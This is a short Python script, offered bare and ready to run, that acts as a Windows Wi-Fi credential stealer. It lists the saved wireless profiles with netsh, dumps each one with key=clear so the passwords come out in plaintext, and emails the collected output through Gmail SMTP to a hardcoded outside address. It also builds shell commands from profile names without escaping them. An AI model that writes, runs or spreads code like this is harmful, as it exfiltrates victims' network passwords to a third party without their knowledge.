#!/usr/bin/python
import subprocess
import smtplib
import re

def send_mail(email, app_pass, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, app_pass)

    # Encode the message in UTF-8
    message = message.encode('utf-8')

    server.sendmail(email, email, message)
    server.quit()


app_pass = "enter_key_here"

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8', errors='replace')
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = 'netsh wlan show profile "' + network_name + '" key=clear'
    try:
        network_result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8', errors='replace')
        result += network_result
    except subprocess.CalledProcessError as e:
        # Handle errors if the command fails
        result += f"Error executing command for network '{network_name}': {e.output.decode('utf-8', errors='replace')}"

send_mail("karisallan237@gmail.com", app_pass, result)